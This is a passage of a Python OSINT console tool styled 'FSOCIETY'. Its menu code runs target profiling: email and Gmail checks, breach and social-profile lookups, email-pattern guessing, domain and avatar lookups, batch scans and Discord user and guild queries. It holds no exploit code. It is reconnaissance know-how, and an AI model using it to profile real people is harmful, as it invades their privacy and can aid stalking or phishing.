        print(f"\n{Colors.PRIMARY}╔═══════════════════════════════════════════════════════════════╗")
        print(f"║ OSINT SESSION STATISTICS                                            ║")
        print(f"╠═══════════════════════════════════════════════════════════════╣")
        print(f"║ Targets Analyzed:   {len(self.engine.checked_targets):<44}║")
        print(f"║ Breaches Found:     {self.engine.total_breaches:<44}║")
        print(f"║ Social Profiles:    {self.engine.total_social:<44}║")
        print(f"║ Average Risk:       {self.engine.average_risk:.1f}/100{35 - len(str(int(self.engine.average_risk))):<44}║")
        print(f"║ Session Duration:   {elapsed:.0f} seconds{36 - len(str(int(elapsed))):<44}║")
        print(f"╚═══════════════════════════════════════════════════════════════╝{TextEffects.RESET}")
    
    def run_discord_user_intel(self):
        user_id = clean_input(input(f"{Colors.SECONDARY}    Discord User ID: {TextEffects.RESET}"))
        if user_id:
            print(f"{Colors.INFO}    [*] Gathering Discord user intelligence...{Colors.RESET}")
            VisualEffects.show_progress("Querying API", 1)
            result = self.discord_intel.lookup_user(user_id)
            if result:
                print(f"\n{Colors.PRIMARY}{'='*50}{Colors.RESET}")
                print(f"{Colors.SUCCESS}[+] Discord User Found{Colors.RESET}")
                print(f"  Username: {result.get('username')}#{result.get('discriminator')}")
                print(f"  User ID: {result.get('id')}")
                print(f"  Public Flags: {result.get('public_flags', 0)}")
                if result.get('banner'):
                    print(f"  Banner: Yes")
                print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}\n")
            else:
                print(f"{Colors.ERROR}[-] User not found or rate limited{Colors.RESET}\n")
    
    def run_discord_guild_intel(self):
        guild_id = clean_input(input(f"{Colors.SECONDARY}    Discord Guild ID: {TextEffects.RESET}"))
        if guild_id:
            print(f"{Colors.INFO}    [*] Gathering guild intelligence...{Colors.RESET}")
            VisualEffects.show_progress("Querying API", 1)
            result = self.discord_intel.lookup_guild(guild_id)
            if result:
                print(f"\n{Colors.PRIMARY}{'='*50}{Colors.RESET}")
                print(f"{Colors.SUCCESS}[+] Guild Found{Colors.RESET}")
                print(f"  Name: {result.get('name')}")
                print(f"  Guild ID: {result.get('id')}")
                print(f"  Member Count: {result.get('approximate_member_count', 'N/A')}")
                print(f"  Online Members: {result.get('approximate_presence_count', 'N/A')}")
                print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}\n")
            else:
                print(f"{Colors.ERROR}[-] Guild not found or inaccessible{Colors.RESET}\n")
    
    def run_discord_invite_resolver(self):
        invite_code = clean_input(input(f"{Colors.SECONDARY}    Invite Code: {TextEffects.RESET}"))
        if invite_code:
            print(f"{Colors.INFO}    [*] Resolving invite...{Colors.RESET}")
            VisualEffects.show_progress("Querying API", 1)
            result = self.discord_intel.resolve_invite(invite_code)
            if result:
                print(f"\n{Colors.PRIMARY}{'='*50}{Colors.RESET}")
                print(f"{Colors.SUCCESS}[+] Invite Valid{Colors.RESET}")
                print(f"  Guild: {result.get('guild', {}).get('name', 'Unknown')}")
                print(f"  Channel: {result.get('channel', {}).get('name', 'Unknown')}")
                print(f"  Inviter: {result.get('inviter', {}).get('username', 'Unknown')}")
                print(f"  Approximate Members: {result.get('approximate_member_count', 'N/A')}")
                print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}\n")
            else:
                print(f"{Colors.ERROR}[-] Invalid or expired invite{Colors.RESET}\n")
    
    def execute(self):
        display_header()
        
        while True:
            self.show_menu()
            choice = input(f"{Colors.SECONDARY}\n    ┌─[FSOCIETY@OSINT]─[{datetime.now().strftime('%H:%M')}]\n    └──╼ {TextEffects.RESET}")
            
            if choice == '0':
                self.show_statistics()
                print(f"{Colors.SECONDARY}\n    Stay anonymous. Stay safe.\n{TextEffects.RESET}")
                break
            
            elif choice == '1':
                email = clean_input(input(f"{Colors.SECONDARY}    Email target: {TextEffects.RESET}"))
                username = email.split('@')[0]
                result = self.engine.gmail_scanner.check_availability(username)
                print(f"\n{Colors.PRIMARY}{'='*50}{Colors.RESET}")
                if result['available']:
                    print(f"{Colors.SUCCESS}[+] {result['email']} is AVAILABLE!{Colors.RESET}")
                elif result['available'] is False:
                    print(f"{Colors.ERROR}[-] {result['email']} is REGISTERED{Colors.RESET}")
                else:
                    print(f"{Colors.WARNING}[?] {result['email']} - {result['status']}{Colors.RESET}")
                print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}\n")
            
            elif choice == '2':
                email = clean_input(input(f"{Colors.SECONDARY}    Email to validate: {TextEffects.RESET}"))
                result = self.engine.email_validator.validate_email(email)
                print(f"\n{Colors.PRIMARY}{'='*50}{Colors.RESET}")
                if result.get('valid'):
                    print(f"{Colors.SUCCESS}[+] Valid email address{Colors.RESET}")
                    print(f"  Domain: {result['domain']}")
                    print(f"  MX Servers: {', '.join(result.get('mx_servers', ['None']))}")
                    print(f"  Temporary: {'YES' if result.get('temporary') else 'NO'}")
                else:
                    print(f"{Colors.ERROR}[-] Invalid: {result.get('error')}{Colors.RESET}")
                print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}\n")
            
            elif choice == '3':
                email = clean_input(input(f"{Colors.SECONDARY}    Target email: {TextEffects.RESET}"))
                results = self.engine.analyze_target(email)
                self.engine.checked_targets.append(email)
                
                print(f"\n{Colors.PRIMARY}{'='*60}{Colors.RESET}")
                print(f"{Colors.INFO}[TARGET] {results['email']}{Colors.RESET}")
                print(f"{Colors.INFO}[RISK] {results['rating']} ({results['risk_score']}/100){Colors.RESET}")
                
                if results['gmail_status']:
                    if results['gmail_status']['available'] is False:
                        print(f"{Colors.ERROR}[STATUS] Gmail account registered{Colors.RESET}")
                    elif results['gmail_status']['available']:
                        print(f"{Colors.SUCCESS}[STATUS] Gmail account available{Colors.RESET}")
                
                if results['breaches']:
                    print(f"\n{Colors.ERROR}[BREACHES] {len(results['breaches'])}{Colors.RESET}")
                    for src in results['sources'][:5]:
                        print(f"  • {src}")
                
                if results['social_media']:
                    print(f"\n{Colors.INFO}[SOCIAL] {len(results['social_media'])} platforms{Colors.RESET}")
                    for platform in results['social_media'][:5]:
                        print(f"  • {platform}")
                
                print(f"{Colors.PRIMARY}{'='*60}{Colors.RESET}\n")
                
                save_choice = input(f"{Colors.SECONDARY}    Save report? (y/n/html): {TextEffects.RESET}")
                if save_choice.lower() == 'y':
                    self.engine.save_report(results, 'txt')
                elif save_choice.lower() == 'html':
                    self.engine.save_report(results, 'html')
            
            elif choice == '4':
                username = clean_input(input(f"{Colors.SECONDARY}    Username to search: {TextEffects.RESET}"))
                print(f"{Colors.INFO}    [*] Scanning platforms...{Colors.RESET}")
                results = self.engine.social_scanner.scan_platforms(username)
                print(f"\n{Colors.PRIMARY}{'='*50}{Colors.RESET}")
                print(f"{Colors.INFO}[USERNAME] {username}{Colors.RESET}")
                if results:
                    print(f"{Colors.SUCCESS}[+] Found on {len(results)} platforms:{Colors.RESET}")
                    for platform in results:
                        print(f"  • {platform}")
                else:
                    print(f"{Colors.WARNING}[!] No profiles detected{Colors.RESET}")
                print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}\n")
            
            elif choice == '5':
                password = input(f"{Colors.SECONDARY}    Password to analyze: {TextEffects.RESET}")
                result = self.engine.credential_analyzer.analyze_strength(password)
                print(f"\n{Colors.PRIMARY}{'='*50}{Colors.RESET}")
                print(f"{Colors.INFO}[PASSWORD ANALYSIS]{Colors.RESET}")
                print(f"  Strength: {result['color']}{result['strength']}{Colors.RESET}")
                print(f"  Score: {result['score']}/100")
                print(f"\n{Colors.WARNING}[FEEDBACK]{Colors.RESET}")
                for fb in result['feedback']:
                    print(f"  {fb}")
                print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}\n")
            
            elif choice == '6':
                first = clean_input(input(f"{Colors.SECONDARY}    First Name: {TextEffects.RESET}"))
                last = clean_input(input(f"{Colors.SECONDARY}    Last Name: {TextEffects.RESET}"))
                domain = clean_input(input(f"{Colors.SECONDARY}    Domain (default: gmail.com): {TextEffects.RESET}") or "gmail.com")
                patterns = self.engine.pattern_engine.generate_email_patterns(first, last, domain)
                print(f"\n{Colors.PRIMARY}{'='*50}{Colors.RESET}")
                print(f"{Colors.INFO}[PATTERN GENERATION]{Colors.RESET}")
                for i, p in enumerate(patterns['patterns'][:15], 1):
                    print(f"  {i}. {p}")
                print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}\n")
            
            elif choice == '7':
                domain = clean_input(input(f"{Colors.SECONDARY}    Domain to analyze: {TextEffects.RESET}"))
                info = self.engine.domain_analyzer.get_details(domain)
                print(f"\n{Colors.PRIMARY}{'='*50}{Colors.RESET}")
                print(f"{Colors.INFO}[DOMAIN] {domain}{Colors.RESET}")
                if 'error' in info:
                    print(f"{Colors.WARNING}[!] {info['error']}{Colors.RESET}")
                else:
                    print(f"  Registrar: {info.get('registrar', 'N/A')}")
                    print(f"  Created: {info.get('created', 'N/A')}")
                    print(f"  Expires: {info.get('expires', 'N/A')}")
                    print(f"  Nameservers: {', '.join(info.get('nameservers', ['N/A']))}")
                print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}\n")
            
            elif choice == '8':
                email = clean_input(input(f"{Colors.SECONDARY}    Email: {TextEffects.RESET}"))
                avatar = self.engine.avatar_lookup.lookup(email)
                print(f"\n{Colors.PRIMARY}{'='*50}{Colors.RESET}")
                if avatar['exists']:
                    print(f"{Colors.SUCCESS}[+] Avatar found!{Colors.RESET}")
                    print(f"  URL: {avatar['url']}")
                else:
                    print(f"{Colors.WARNING}[!] No avatar associated{Colors.RESET}")
                print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}\n")
            
            elif choice == '9':
                print(f"{Colors.WARNING}[!] Enter targets (one per line). Type 'DONE' to finish{Colors.RESET}")
                targets = []
                while True:
                    line = clean_input(input(f"{Colors.SECONDARY}    > {TextEffects.RESET}"))
                    if line.upper() == 'DONE':
                        break
                    if line and '@' in line:
                        targets.append(line.strip())
                if targets:
                    print(f"\n{Colors.INFO}[*] Processing {len(targets)} targets...{Colors.RESET}\n")
                    for i, target in enumerate(targets, 1):
                        print(f"{Colors.PRIMARY}[{i}/{len(targets)}] Analyzing: {target}{Colors.RESET}")
                        results = self.engine.analyze_target(target)
                        self.engine.checked_targets.append(target)
                        print(f"  Risk Score: {results['risk_score']}/100")
                        print(f"  Social: {len(results['social_media'])}")
                        print()
            
            elif choice == '10':
                self.run_discord_user_intel()
            
            elif choice == '11':
                self.run_discord_guild_intel()
            
            elif choice == '12':
                self.run_discord_invite_resolver()
            
            elif choice == '13':
                self.show_statistics()
            
            else:
                print(f"{Colors.ACCENT}[!] Invalid selection{Colors.RESET}")

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    try:
        app = OSINTApplication()
        app.execute()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Session terminated{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}[!] Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    main()